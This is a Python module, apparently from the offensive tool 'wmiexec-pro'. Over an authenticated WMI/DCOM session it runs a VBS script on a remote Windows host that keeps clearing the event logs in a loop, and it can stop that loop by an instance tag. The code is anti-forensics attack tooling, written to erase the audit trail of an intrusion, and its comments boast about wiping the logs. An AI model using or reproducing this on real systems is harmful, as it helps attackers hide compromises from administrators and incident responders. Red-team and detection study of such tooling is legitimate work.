import logging

from lib.helpers import get_vbs
from lib.methods.executeScript import executeScript_Toolkit
from lib.module_base import ModuleBase


class eventlog_Toolkit(ModuleBase):
    name = "eventlog"
    description = "Loopping cleanning eventlog."

    @staticmethod
    def register_parser(subparsers):
        p = subparsers.add_parser(eventlog_Toolkit.name, help=eventlog_Toolkit.description)
        p.add_argument("-risk-i-know", action="store_true", help="You know what will happen :)")
        p.add_argument("-retrieve", action="store", metavar="ID", help="Stop looping cleaning eventlog with the instance id.")
        return p

    @staticmethod
    def run(iWbemLevel1Login, dcom, options, **kwargs):
        toolkit = eventlog_Toolkit(iWbemLevel1Login)
        if options.risk_i_know:
            toolkit.fuck_EventLog()
        if options.retrieve:
            toolkit.retrieve_EventLog(options.retrieve)

    def __init__(self, iWbemLevel1Login):
        self.iWbemLevel1Login = iWbemLevel1Login
        self.logger = logging.getLogger("wmiexec-pro")

    def fuck_EventLog(self):
        executer = executeScript_Toolkit(self.iWbemLevel1Login)
        tag = executer.ExecuteScript(script_content=get_vbs("ClearEventlog.vbs"), returnTag=True)
        self.logger.warning(f"Keepping note of this tag if you want to stop it: {tag}")
    
    def retrieve_EventLog(self, tag):
        executer = executeScript_Toolkit(self.iWbemLevel1Login)
        executer.remove_Event(tag)
        self.logger.info("Stop fucking eventlog :)")